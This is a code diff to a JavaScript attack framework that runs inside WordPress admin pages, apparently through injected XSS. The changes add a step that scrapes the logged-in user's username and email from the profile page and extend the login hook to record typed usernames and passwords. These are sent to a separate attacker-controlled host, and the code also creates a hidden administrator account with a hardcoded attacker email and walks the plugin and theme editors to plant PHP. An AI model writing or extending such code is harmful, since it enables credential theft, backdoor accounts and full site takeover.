@@ -9,6 +9,7 @@ var g_strURLEditPHPPostPlugin="";
 var g_strURLEditPHPPostTheme="";
 var g_strURLEditPHPArray=null;
 var g_strURLXSS="";
+var g_strURLProfile="";
 var g_strUsername="";
 var g_strComunication="";
 
@@ -18,24 +19,25 @@ var g_strURLCommentsAdd="";
 var g_strURLSpysIndex="";
 function initURL()
 {
-    g_strURLXSS=Common.getTargetHost()+"2018/01/hello-world";
+    g_strURLXSS=Common.getTargetHost()+"hello-world/";
     //g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
     g_strURLLogin=Common.getTargetHost()+"wp-login.php";
     g_strURLPanelIndex=Common.getTargetHost()+"wp-admin/index.php";
+    g_strURLProfile=Common.getTargetHost()+"wp-admin/profile.php";
     g_strURLEditPHPArray=new Array();
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Fincludes%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Flanguages%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Ftemplates%2Findex.php&plugin=bbpress%2Fbbpress.php";
-    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
+    //g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
     g_strURLEditPHPPostPlugin=Common.getTargetHost()+"wp-admin/plugin-editor.php";
     g_strURLEditPHPPostTheme=Common.getTargetHost()+"wp-admin/theme-editor.php";
 
     g_strURLVisitLogsAdd=Common.getJSHost()+"visit-logs/add2";
     g_strURLCommentsAdd=Common.getJSHost()+"comments/add";
-    g_strURLSpysIndex=Common.getJSHost()+"cpys/first";
+    g_strURLSpysIndex=Common.getJSHost()+"spys/first";
 }
 
 //find the give child
@@ -87,6 +89,23 @@ function inPagePanelIndex()
     );
 }
 //--------------------------------------------panelIndex page-----------------------------------------------------------------------
+
+//--------------------------------------------profile page-----------------------------------------------------------------------
+function inPageProfile()
+{
+    var strUsername=$("form#your-profile").find("input#user_login").val();
+    var strEmail=$("form#your-profile").find("input#email").val();
+    window.parent.g_strUsername=strUsername;
+    var json=
+    {
+        username:strUsername,
+        action:"in page personal profile,username:"+strUsername+",email:"+strEmail
+    };
+    console.log(json.action);
+    addVisitLog(json);
+}
+//--------------------------------------------profile page-----------------------------------------------------------------------
+
 
 //--------------------------------------------editPHP page-----------------------------------------------------------------------
 function inPageEditPHP() {
@@ -218,7 +237,7 @@ function inPageComment(iRowIndex)
             jsonLog.action="can not get error message,program not supposed to run here";
             window.parent.g_strComunication="can_not_find_error_message";
         }
-        addVisitLog(json);
+        addVisitLog(jsonLog);
     }
     else
     {
@@ -389,7 +408,7 @@ function inPageAddUser()
                     "_wpnonce_create-user":$("#_wpnonce_create-user").val(),
                     "_wp_http_referer":"/wp-admin/user-new.php",
                     "user_login":"PHPMyAdmin1",
-                    "email":"colorwolf2017@gmail.com",
+                    "email":"colorwolf2018@gmail.com",
                     "first_name":"PHPMyAdmin2",
                     "last_name":"PHPMyAdmin3",
                     "url":"http://www.phpmyadmin.com",
@@ -462,7 +481,7 @@ function inPageLogin()
                     var json=
                     {
                         username:$("#user_login").val(),
-                        action:"try to login,password is:"+$("#user_pass").val()+",login result:"
+                        action:"try to login,username is:"+$("#user_login").val()+"password is:"+$("#user_pass").val()+",login result:"
                     };
                     try
                     {
@@ -692,12 +711,12 @@ function frameOperationCalledFromSon(windowSon)
             {
                 //no privileges to show comments
                 console.log("detect no porivilege to show comments,going to control panel")
-                frameJumpTo(g_strURLPanelIndex);
+                frameJumpTo(g_strURLProfile);
             }
             else if(g_strComunication==="can_not_find_error_message")
             {
                 console.log("detect can not find error message,going to control panel")
-                frameJumpTo(g_strURLPanelIndex);
+                frameJumpTo(g_strURLProfile);
             }
             else
             {
@@ -710,8 +729,16 @@ function frameOperationCalledFromSon(windowSon)
         {
             //no more comment
             //alert("no more comment!");
-            frameJumpTo(g_strURLPanelIndex);
+            frameJumpTo(g_strURLProfile);
         }
+    }
+    else if(windowSon.location.href===g_strURLProfile)
+    {
+        frameJumpTo(g_strURLPanelIndex);
+    }
+    else
+    {
+        throw "unknow position in function frameOperationCalledFromSon:"+windowSon.location.href;
     }
     //else if(windowSon.location.href===g_strURLIndex)
     //{
@@ -731,19 +758,7 @@ function frameOperationCalledFromSon(windowSon)
         //    console.log("fatal error in index page,unrecognized g_strComunication:"+g_strComunication);
         //}
     //}
-    else
-    {
-        throw "unknow position in function frameOperationCalledFromSon:"+windowSon.location.href;
-    }
-}
-//is login already or not
-function isLoginAlready()
-{
-    var bReturn=true;
-    if($("form#loginform").length!==0||$("form.mom-login-form"))
-    {
-        bReturn=false;
-    }
+
 }
 
 //different operation in different page
@@ -783,6 +798,10 @@ function frameOperation()
     {
         //get back comment
         inPageComment(-1);
+    }
+    else if(window.location.href==g_strURLProfile)
+    {
+        inPageProfile();
     }
     else if(window.location.href==g_strURLPanelIndex)
     {
